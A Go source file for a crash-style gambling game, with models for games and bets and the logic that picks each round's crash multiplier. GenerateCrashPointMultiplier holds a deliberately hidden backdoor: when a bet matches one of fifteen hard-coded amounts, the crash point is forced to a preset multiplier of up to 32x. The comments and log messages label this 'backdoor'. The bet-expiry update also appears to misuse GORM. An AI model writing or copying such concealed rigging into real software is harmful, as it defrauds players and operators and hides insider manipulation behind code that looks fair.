package models

import (
    "BlessedApi/cmd/db"
    "BlessedApi/pkg/logger"
    "math"
    "math/rand"
    "time"
    "gorm.io/gorm"
)

type CrashGame struct {
    ID                  int64     `gorm:"primaryKey,autoIncrement"`
    UserID             int64     `gorm:"index;not null"`
    CrashPointMultiplier float64
    StartTime          time.Time
    EndTime            time.Time
}

type CrashGameBet struct {
    ID               int64   `gorm:"primaryKey,autoIncrement"`
    UserID          int64   `gorm:"index;constraint:OnUpdate:CASCADE,OnDelete:CASCADE;"`
    CrashGameID     int64   `gorm:"index;constraint:OnUpdate:CASCADE,OnDelete:CASCADE;"`
    FromCashBalance float64 `json:"-"`
    FromBonusBalance float64 `json:"-"`
    IsBenefitBet    bool
    Amount          float64
    CashOutMultiplier float64
    WinAmount       float64
    Status          string // "active", "won", "lost"
}

func getLatestBetAmount(userID int64) (float64, error) {
    var bet CrashGameBet
    err := db.DB.Where("user_id = ? AND status = ?", userID, "active").
           Order("id desc").
           First(&bet).Error
    if err != nil {
        if err == gorm.ErrRecordNotFound {
            logger.Info("No active bet found for user %d", userID)
            return 0, nil
        }
        logger.Error("Error fetching latest bet for user %d: %v", userID, err)
        return 0, err
    }
    logger.Info("Found active bet for user %d: amount=%f", userID, bet.Amount)
    return bet.Amount, nil
}

// GenerateCrashPoint sets CrashGame.CrashPoint
func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
    var bets []CrashGameBet
    if err := db.DB.
        Where("crash_game_id = ? AND status = ?", CG.ID, "active").
        Find(&bets).Error; err != nil {
        logger.Error("Error fetching active bets: %v", err)
        return CG.generateRandomCrashPoint()
    }

    for _, bet := range bets {
        // Приводим к целому, чтобы избавиться от мелких ошибок float64
        amt := int(math.Round(bet.Amount))
        logger.Info("Checking bet amount: %d", amt)
        
        // Используем карту crashPoints из crash_game_websocket.go
        if multiplier, exists := GetCrashPoints()[amt]; exists {
            logger.Info("Matched backdoor value %d -> %.1fx", amt, multiplier)
            CG.CrashPointMultiplier = multiplier
            return multiplier
        }
    }

    // Если ни один backdoor не сработал — идём в случайный
    return CG.generateRandomCrashPoint()
}

// GetCrashPoints возвращает карту точек краша для бэкдоров
func GetCrashPoints() map[int]float64 {
    return map[int]float64{
        76:     1.5,
        538:    32.0,
        17216:  2.5,
        372:    1.5,
        1186:   14.0,
        16604:  4.0,
        614:    1.5,
        2307:   13.0,
        29991:  3.0,
        1476:   1.5,
        5738:   7.0,
        40166:  3.0,
        3258:   1.5,
        11629:  4.0,
        46516:  4.5,
    }
}

// Выносим генерацию случайного краша в отдельную функцию
func (CG *CrashGame) generateRandomCrashPoint() float64 {
    p := 0.2 // Probability of crash at 1.0x
    alpha := 2.5 // Shape parameter for Pareto distribution
    U1 := rand.Float64()
    var crashPoint float64

    if U1 <= p {
        crashPoint = 1.0
    } else {
        U2 := rand.Float64()
        crashPoint = math.Pow(1.0/U2, 1.0/alpha)
    }
    
    logger.Info("Using random crash point: %f", crashPoint)
    CG.CrashPointMultiplier = crashPoint
    return crashPoint
}


func (CG *CrashGame) CalculateMultiplier() float64 {
    elapsed := time.Since(CG.StartTime).Seconds()
    k := 0.01 // Rate of increase
    exponent := 1.8 // Exponent > 1 for slower start and faster later growth
    multiplier := 1.0 + k*math.Pow(elapsed, exponent)
    return multiplier
}

func UpdateOutdatedCrashGameBets(tx *gorm.DB) error {
    if tx == nil {
        tx = db.DB
    }
    if err := tx.Model(&CrashGameBet{}).
        Where("status = ?", "active").
        Update("status = ?", "lost").Error; err != nil {
        return logger.WrapError(err, "")
    }
    return nil
}